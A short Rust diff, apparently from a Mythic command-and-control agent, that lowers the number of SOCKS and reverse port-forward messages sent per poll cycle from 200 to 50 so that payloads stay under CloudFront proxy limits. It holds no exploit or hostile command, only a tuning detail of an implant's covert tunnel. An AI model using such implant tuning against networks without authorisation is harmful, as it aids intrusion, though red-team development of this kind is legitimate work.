@@ -213,8 +213,9 @@ fn buffer_message(msg: MythicMessage) {
 }
 
 /// Maximum number of SOCKS/RPFWD messages to include per poll cycle.
-/// Prevents oversized messages that could hit CloudFront/proxy payload limits.
-const MAX_SOCKS_PER_POLL: usize = 200;
+/// Each message is ~5.5KB (4KB data + base64 overhead). Keep total proxy data
+/// well under CloudFront/proxy payload limits (~1MB).
+const MAX_SOCKS_PER_POLL: usize = 50;
 
 /// Create a MythicMessage for polling, draining all buffered data
 fn create_mythic_poll_message(buffer: &mut ResponseBuffer) -> MythicMessage {
